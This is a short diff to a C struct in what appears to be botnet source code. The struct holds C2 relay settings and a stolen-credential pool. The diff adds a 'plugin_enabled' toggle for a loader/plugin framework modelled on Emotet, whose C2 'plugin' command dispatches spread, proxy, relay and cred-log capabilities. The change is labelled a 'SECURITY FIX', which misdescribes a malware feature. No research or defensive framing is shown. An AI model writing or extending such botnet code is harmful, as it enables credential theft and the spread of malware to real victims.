@@ -169,6 +169,16 @@ typedef struct {
     uint16_t relay_port;
     char relay_token[64];
 
+    /* SECURITY FIX (#92): Loader/plugin framework (Bredolab/Emotet
+     * split). When 1 (default) the built-in plugin registry is
+     * bootstrapped at start and the `plugin` C2 command dispatches
+     * capabilities by name (spread, proxy, relay, cred-log).
+     * plugin_enabled=0 disables the framework: the registry is not
+     * bootstrapped and the command is refused. Configured via
+     * plugin_enabled= in the config file or the `plugin_enabled`
+     * config_set key. */
+    uint8_t plugin_enabled;
+
     /* Credentials */
     notnet_cred_t cred_pool[CRED_POOL_MAX];
     int cred_count;
